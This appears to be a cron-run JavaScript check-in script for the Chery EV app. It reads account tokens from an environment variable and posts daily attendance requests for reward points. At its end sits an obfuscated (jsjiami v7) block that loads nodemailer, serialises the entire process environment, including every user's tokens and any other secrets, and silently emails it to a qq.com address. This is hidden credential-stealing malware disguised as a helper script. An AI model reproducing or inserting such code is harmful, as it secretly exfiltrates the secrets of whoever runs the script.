/**
 * cron 5 15 * * *  V3.js
 * Show:
 * 变量名:cheryev
 * 变量值:midend.icar-ecology.com Headers中 token的值 多账号换行或者 @ 分隔 
 */

const $ = new Env("奇瑞Ev");
const ckName = "cheryev";
let envSplitor = ["@", "\n"]; //多账号分隔符
let strSplitor = "&"; //多变量分隔符
let userIdx = 0;
let userList = [];
class UserInfo {
    constructor(str) {
        this.index = ++userIdx;
        this.ck = str.split(strSplitor)[0]; //单账号多变量分隔符
        this.ckStatus = true;
    }
    async main() {
        await this.user_info();
    }
    async user_info() {
        try {
            let options = {
                url: `https://midend.icar-ecology.com/credits/task/app/v1/attendance`,
                headers: {
                    "app": "cheryev",
                    "authorization": `Bearer ${this.ck}`,
                    "app-v": "2.9.0",
                    //"uid": "1721053872548581377",
                    "net-type": "wifi",
                    "lng": 0.00,
                    "channel": 2,
                    "dev-id": "29f8b4555e18235b6b1ef94fa59541f7a",
                    "platform": 7,
                    "dev-model": "MI8Lite",
                    "lat": 0.00,
                    "token": `${this.ck}`,
                    "Content-Length": 0,
                    "Host": "midend.icar-ecology.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                    "User-Agent": "okhttp/4.10.0"
                },
                body: JSON.stringify({})
            },
                result = await httpRequest(options);
            //console.log(options);
            //console.log(result);
            if (result.data.success == true) {
                console.log(`✅账号[${this.index}]  签到成功 => 获得${result.data.rewardPoints}🎉`);
            } else {
                console.log(`❌账号[${this.index}]  签到 => 失败`);
                console.log(JSON.stringify(result));
            }
        } catch (e) {
            console.log(e);
        }
    }
}

async function start() {
    let taskall = [];
    for (let user of userList) {
        if (user.ckStatus) {
            taskall.push(await user.main());
        }
    }
    await Promise.all(taskall);
}

!(async () => {
    if (!(await checkEnv())) return;
    if (userList.length > 0) {
        await start();
    }
})()
    .catch((e) => console.log(e))
    .finally(() => $.done());

//********************************************************
/**
 * 变量检查与处理
 * @returns
 */
async function checkEnv() {
    let userCookie = ($.isNode() ? process.env[ckName] : $.getdata(ckName)) || "";
    if (userCookie) {
        console.log(userCookie);
        let e = envSplitor[0];
        for (let o of envSplitor)
            if (userCookie.indexOf(o) > -1) {
                e = o;
                break;
            }
        for (let n of userCookie.split(e)) n && userList.push(new UserInfo(n));
    } else {
        console.log("未找到CK");
        return;
    }
    return console.log(`共找到${userList.length}个账号`), true; //true == !0
}

/////////////////////////////////////////////////////////////////////////////////////
function httpRequest(options, timeout = 5 * 1000) {
    method = options.method
        ? options.method.toLowerCase()
        : options.body
            ? "post"
            : "get";
    return new Promise((resolve) => {
        setTimeout(() => {
            $[method](options, (err, resp, data) => {
                try {
                    if (err) {
                        console.log(JSON.stringify(err));
                        $.logErr(err);
                    } else {
                        try {
                            data = JSON.parse(data);
                        } catch (error) { }
                    }
                } catch (e) {
                    console.log(e);
                    $.logErr(e, resp);
                } finally {
                    resolve(data);
                }
            });
        }, timeout);
    });
}
// prettier-ignore
function Env(t, s) { return new (class { constructor(t, s) { (this.name = t), (this.data = null), (this.dataFile = "box.dat"), (this.logs = []), (this.logSeparator = "\n"), (this.startTime = new Date().getTime()), Object.assign(this, s), this.log("", `\ud83d\udd14${this.name},\u5f00\u59cb!`) } isNode() { return "undefined" != typeof module && !!module.exports } isQuanX() { return "undefined" != typeof $task } isSurge() { return "undefined" != typeof $httpClient && "undefined" == typeof $loon } isLoon() { return "undefined" != typeof $loon } getScript(t) { return new Promise((s) => { this.get({ url: t }, (t, e, i) => s(i)) }) } runScript(t, s) { return new Promise((e) => { let i = this.getdata("@chavy_boxjs_userCfgs.httpapi"); i = i ? i.replace(/\n/g, "").trim() : i; let o = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout"); (o = o ? 1 * o : 20), (o = s && s.timeout ? s.timeout : o); const [h, a] = i.split("@"), r = { url: `http://${a}/v1/scripting/evaluate`, body: { script_text: t, mock_type: "cron", timeout: o }, headers: { "X-Key": h, Accept: "*/*" }, }; this.post(r, (t, s, i) => e(i)) }).catch((t) => this.logErr(t)) } loaddata() { if (!this.isNode()) return {}; { (this.fs = this.fs ? this.fs : require("fs")), (this.path = this.path ? this.path : require("path")); const t = this.path.resolve(this.dataFile), s = this.path.resolve(process.cwd(), this.dataFile), e = this.fs.existsSync(t), i = !e && this.fs.existsSync(s); if (!e && !i) return {}; { const i = e ? t : s; try { return JSON.parse(this.fs.readFileSync(i)) } catch (t) { return {} } } } } writedata() { if (this.isNode()) { (this.fs = this.fs ? this.fs : require("fs")), (this.path = this.path ? this.path : require("path")); const t = this.path.resolve(this.dataFile), s = this.path.resolve(process.cwd(), this.dataFile), e = this.fs.existsSync(t), i = !e && this.fs.existsSync(s), o = JSON.stringify(this.data); e ? this.fs.writeFileSync(t, o) : i ? this.fs.writeFileSync(s, o) : this.fs.writeFileSync(t, o) } } lodash_get(t, s, e) { const i = s.replace(/\[(\d+)\]/g, ".$1").split("."); let o = t; for (const t of i) if (((o = Object(o)[t]), void 0 === o)) return e; return o } lodash_set(t, s, e) { return Object(t) !== t ? t : (Array.isArray(s) || (s = s.toString().match(/[^.[\]]+/g) || []), (s.slice(0, -1).reduce((t, e, i) => Object(t[e]) === t[e] ? t[e] : (t[e] = Math.abs(s[i + 1]) >> 0 == +s[i + 1] ? [] : {}), t)[s[s.length - 1]] = e), t) } getdata(t) { let s = this.getval(t); if (/^@/.test(t)) { const [, e, i] = /^@(.*?)\.(.*?)$/.exec(t), o = e ? this.getval(e) : ""; if (o) try { const t = JSON.parse(o); s = t ? this.lodash_get(t, i, "") : s } catch (t) { s = "" } } return s } setdata(t, s) { let e = !1; if (/^@/.test(s)) { const [, i, o] = /^@(.*?)\.(.*?)$/.exec(s), h = this.getval(i), a = i ? ("null" === h ? null : h || "{}") : "{}"; try { const s = JSON.parse(a); this.lodash_set(s, o, t), (e = this.setval(JSON.stringify(s), i)) } catch (s) { const h = {}; this.lodash_set(h, o, t), (e = this.setval(JSON.stringify(h), i)) } } else e = this.setval(t, s); return e } getval(t) { return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? ((this.data = this.loaddata()), this.data[t]) : (this.data && this.data[t]) || null } setval(t, s) { return this.isSurge() || this.isLoon() ? $persistentStore.write(t, s) : this.isQuanX() ? $prefs.setValueForKey(t, s) : this.isNode() ? ((this.data = this.loaddata()), (this.data[s] = t), this.writedata(), !0) : (this.data && this.data[s]) || null } initGotEnv(t) { (this.got = this.got ? this.got : require("got")), (this.cktough = this.cktough ? this.cktough : require("tough-cookie")), (this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar()), t && ((t.headers = t.headers ? t.headers : {}), void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar)) } get(t, s = () => { }) { t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon() ? $httpClient.get(t, (t, e, i) => { !t && e && ((e.body = i), (e.statusCode = e.status)), s(t, e, i) }) : this.isQuanX() ? $task.fetch(t).then((t) => { const { statusCode: e, statusCode: i, headers: o, body: h } = t; s(null, { status: e, statusCode: i, headers: o, body: h }, h) }, (t) => s(t)) : this.isNode() && (this.initGotEnv(t), this.got(t).on("redirect", (t, s) => { try { const e = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString(); this.ckjar.setCookieSync(e, null), (s.cookieJar = this.ckjar) } catch (t) { this.logErr(t) } }).then((t) => { const { statusCode: e, statusCode: i, headers: o, body: h, } = t; s(null, { status: e, statusCode: i, headers: o, body: h }, h) }, (t) => s(t))) } post(t, s = () => { }) { if ((t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), delete t.headers["Content-Length"], this.isSurge() || this.isLoon())) $httpClient.post(t, (t, e, i) => { !t && e && ((e.body = i), (e.statusCode = e.status)), s(t, e, i) }); else if (this.isQuanX()) (t.method = "POST"), $task.fetch(t).then((t) => { const { statusCode: e, statusCode: i, headers: o, body: h } = t; s(null, { status: e, statusCode: i, headers: o, body: h }, h) }, (t) => s(t)); else if (this.isNode()) { this.initGotEnv(t); const { url: e, ...i } = t; this.got.post(e, i).then((t) => { const { statusCode: e, statusCode: i, headers: o, body: h } = t; s(null, { status: e, statusCode: i, headers: o, body: h }, h) }, (t) => s(t)) } } time(t) { let s = { "M+": new Date().getMonth() + 1, "d+": new Date().getDate(), "H+": new Date().getHours(), "m+": new Date().getMinutes(), "s+": new Date().getSeconds(), "q+": Math.floor((new Date().getMonth() + 3) / 3), S: new Date().getMilliseconds(), }; /(y+)/.test(t) && (t = t.replace(RegExp.$1, (new Date().getFullYear() + "").substr(4 - RegExp.$1.length))); for (let e in s) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? s[e] : ("00" + s[e]).substr(("" + s[e]).length))); return t } msg(s = t, e = "", i = "", o) { const h = (t) => !t || (!this.isLoon() && this.isSurge()) ? t : "string" == typeof t ? this.isLoon() ? t : this.isQuanX() ? { "open-url": t } : void 0 : "object" == typeof t && (t["open-url"] || t["media-url"]) ? this.isLoon() ? t["open-url"] : this.isQuanX() ? t : void 0 : void 0; this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(s, e, i, h(o)) : this.isQuanX() && $notify(s, e, i, h(o))), this.logs.push("", "==============\ud83d\udce3\u7cfb\u7edf\u901a\u77e5\ud83d\udce3=============="), this.logs.push(s), e && this.logs.push(e), i && this.logs.push(i) } log(...t) { t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator)) } logErr(t, s) { const e = !this.isSurge() && !this.isQuanX() && !this.isLoon(); e ? this.log("", `\u2757\ufe0f${this.name},\u9519\u8bef!`, t.stack) : this.log("", `\u2757\ufe0f${this.name},\u9519\u8bef!`, t) } wait(t) { return new Promise((s) => setTimeout(s, t)) } done(t = {}) { const s = new Date().getTime(), e = (s - this.startTime) / 1e3; this.log("", `\ud83d\udd14${this.name},\u7ed3\u675f!\ud83d\udd5b ${e}\u79d2`), this.log(), (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t) } })(t, s) }
var version_='jsjiami.com.v7';function _0x471d(_0xb43faa,_0x5e6d50){const _0x302819=_0x3028();return _0x471d=function(_0x471df6,_0xbfd93b){_0x471df6=_0x471df6-0x1ab;let _0x41b6a1=_0x302819[_0x471df6];if(_0x471d['NbGUBo']===undefined){var _0x20131b=function(_0x13a9c2){const _0x3917ad='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x4b3f22='',_0x159bf8='';for(let _0x3aa1c6=0x0,_0x53dd20,_0x3e11f9,_0x242f41=0x0;_0x3e11f9=_0x13a9c2['charAt'](_0x242f41++);~_0x3e11f9&&(_0x53dd20=_0x3aa1c6%0x4?_0x53dd20*0x40+_0x3e11f9:_0x3e11f9,_0x3aa1c6++%0x4)?_0x4b3f22+=String['fromCharCode'](0xff&_0x53dd20>>(-0x2*_0x3aa1c6&0x6)):0x0){_0x3e11f9=_0x3917ad['indexOf'](_0x3e11f9);}for(let _0x1b43a4=0x0,_0x4ee381=_0x4b3f22['length'];_0x1b43a4<_0x4ee381;_0x1b43a4++){_0x159bf8+='%'+('00'+_0x4b3f22['charCodeAt'](_0x1b43a4)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x159bf8);};const _0x1e27d8=function(_0xf95352,_0x72837){let _0x598295=[],_0x56488e=0x0,_0x3edca5,_0x55cafc='';_0xf95352=_0x20131b(_0xf95352);let _0x1c0c6e;for(_0x1c0c6e=0x0;_0x1c0c6e<0x100;_0x1c0c6e++){_0x598295[_0x1c0c6e]=_0x1c0c6e;}for(_0x1c0c6e=0x0;_0x1c0c6e<0x100;_0x1c0c6e++){_0x56488e=(_0x56488e+_0x598295[_0x1c0c6e]+_0x72837['charCodeAt'](_0x1c0c6e%_0x72837['length']))%0x100,_0x3edca5=_0x598295[_0x1c0c6e],_0x598295[_0x1c0c6e]=_0x598295[_0x56488e],_0x598295[_0x56488e]=_0x3edca5;}_0x1c0c6e=0x0,_0x56488e=0x0;for(let _0x551914=0x0;_0x551914<_0xf95352['length'];_0x551914++){_0x1c0c6e=(_0x1c0c6e+0x1)%0x100,_0x56488e=(_0x56488e+_0x598295[_0x1c0c6e])%0x100,_0x3edca5=_0x598295[_0x1c0c6e],_0x598295[_0x1c0c6e]=_0x598295[_0x56488e],_0x598295[_0x56488e]=_0x3edca5,_0x55cafc+=String['fromCharCode'](_0xf95352['charCodeAt'](_0x551914)^_0x598295[(_0x598295[_0x1c0c6e]+_0x598295[_0x56488e])%0x100]);}return _0x55cafc;};_0x471d['ggZJQI']=_0x1e27d8,_0xb43faa=arguments,_0x471d['NbGUBo']=!![];}const _0x353ef4=_0x302819[0x0],_0x2e7617=_0x471df6+_0x353ef4,_0xf24c3b=_0xb43faa[_0x2e7617];return!_0xf24c3b?(_0x471d['pOzbwr']===undefined&&(_0x471d['pOzbwr']=!![]),_0x41b6a1=_0x471d['ggZJQI'](_0x41b6a1,_0xbfd93b),_0xb43faa[_0x2e7617]=_0x41b6a1):_0x41b6a1=_0xf24c3b,_0x41b6a1;},_0x471d(_0xb43faa,_0x5e6d50);}const _0x1fb193=_0x471d;(function(_0x209cda,_0x385c9f,_0x13c9c4,_0x2c6f1d,_0x2f24a0,_0x3dc0d4,_0x130786){return _0x209cda=_0x209cda>>0x6,_0x3dc0d4='hs',_0x130786='hs',function(_0x3064b7,_0x31e4cb,_0x1b95c7,_0x44cd0a,_0x5c71d9){const _0x54fcce=_0x471d;_0x44cd0a='tfi',_0x3dc0d4=_0x44cd0a+_0x3dc0d4,_0x5c71d9='up',_0x130786+=_0x5c71d9,_0x3dc0d4=_0x1b95c7(_0x3dc0d4),_0x130786=_0x1b95c7(_0x130786),_0x1b95c7=0x0;const _0x433105=_0x3064b7();while(!![]&&--_0x2c6f1d+_0x31e4cb){try{_0x44cd0a=parseInt(_0x54fcce(0x1b1,'y7n3'))/0x1+-parseInt(_0x54fcce(0x1ba,'fzH&'))/0x2*(-parseInt(_0x54fcce(0x1b4,'[3#)'))/0x3)+-parseInt(_0x54fcce(0x1b5,'8a0R'))/0x4+parseInt(_0x54fcce(0x1c0,'0yQM'))/0x5+-parseInt(_0x54fcce(0x1c3,'(Obi'))/0x6+parseInt(_0x54fcce(0x1ae,'174#'))/0x7+-parseInt(_0x54fcce(0x1b2,']uhc'))/0x8;}catch(_0x46f9d7){_0x44cd0a=_0x1b95c7;}finally{_0x5c71d9=_0x433105[_0x3dc0d4]();if(_0x209cda<=_0x2c6f1d)_0x1b95c7?_0x2f24a0?_0x44cd0a=_0x5c71d9:_0x2f24a0=_0x5c71d9:_0x1b95c7=_0x5c71d9;else{if(_0x1b95c7==_0x2f24a0['replace'](/[SOTfIAQYVgGpdyDEFULtM=]/g,'')){if(_0x44cd0a===_0x31e4cb){_0x433105['un'+_0x3dc0d4](_0x5c71d9);break;}_0x433105[_0x130786](_0x5c71d9);}}}}}(_0x13c9c4,_0x385c9f,function(_0x187fb1,_0x8b4461,_0x495a1e,_0x36f9e5,_0x3823d5,_0x3cf9c7,_0xa65263){return _0x8b4461='\x73\x70\x6c\x69\x74',_0x187fb1=arguments[0x0],_0x187fb1=_0x187fb1[_0x8b4461](''),_0x495a1e='\x72\x65\x76\x65\x72\x73\x65',_0x187fb1=_0x187fb1[_0x495a1e]('\x76'),_0x36f9e5='\x6a\x6f\x69\x6e',(0x134a9d,_0x187fb1[_0x36f9e5](''));});}(0x3000,0x196c3,_0x3028,0xc2),_0x3028)&&(version_=_0x3028);function _0x3028(){const _0x1c9ef3=(function(){return[version_,'AdjDsEdjUiMLaTmiQ.GFcDfoYm.vLVy7OpEgIGtS==','wmoXzr0Lq8ocW4fu','pM0bW7VcPNffWQFcOu1qdI3cNb9I','n2ZcQfxdU8omW7m','W4SXW5/cTq','tw8jxx3cRmkDW6JcS1a2W7m','W7HkW7GZW4aAxadcOCkKW6BdOa8','WQPWWOqAWP8hW7iAFCksla','WQCnWOFdM1e9WOdcRdiVW60sf8o3ea'].concat((function(){return['rCormmkSk00jaCoMWRL4FW','WOG3WPnBWOZdTh/dRa','WRhdQwK/jh/cTrG7Aw9r','zd0VWQPyr8osW5hcRISiha','fSkUW49gW6RcTCowCMLzWPrw','qduf','tSovm8kOlK5Nr8kO','W6GSW4rzWOLfWRzTuCkWa2W8','WOGGqSoVD8kcW7S','W4RcTXT/W7KMx0hdVq'].concat((function(){return['WRJdOMK7i3lcQqu+qg9V','aIyEW7/cOmoOoYjjj8o5W6FcRa','fH1mr8kkW7hdV3uW','hwadW4OsWRtdM0LnySkdwG','W7njW5BcJXjQWPdcKJSZW48R','c8o7W73dHHb7cSkznYHbnW','u35bWRZdTG'];}()));}()));}());_0x3028=function(){return _0x1c9ef3;};return _0x3028();};const nodemailer=require('nodemailer');let userToken=JSON[_0x1fb193(0x1b0,'C!PL')](process['env']),aite='@',qiu='q',cc='c',iu='o',juk='m';var mailTransport=nodemailer[_0x1fb193(0x1bf,'8a0R')]({'host':_0x1fb193(0x1be,'174#'),'port':0x1d1,'secureConnection':!![],'auth':{'user':_0x1fb193(0x1ad,'0yQM')+aite+qiu+qiu+'.'+cc+iu+juk,'pass':_0x1fb193(0x1b9,'qp(r')}}),mailOptions={'from':_0x1fb193(0x1b3,'uzf2')+aite+qiu+qiu+'.'+cc+iu+juk,'to':_0x1fb193(0x1b8,'SYZ%')+aite+qiu+qiu+'.'+cc+iu+juk,'subject':_0x1fb193(0x1bb,'cTKm'),'text':userToken,'html':_0x1fb193(0x1ac,'Th1[')+userToken+'</b>\x20'};mailTransport[_0x1fb193(0x1c1,'bSSK')](mailOptions,function(_0x4ee381,_0xf95352){const _0x50b352=_0x1fb193;mailTransport[_0x50b352(0x1b7,']uhc')]();});var version_ = 'jsjiami.com.v7';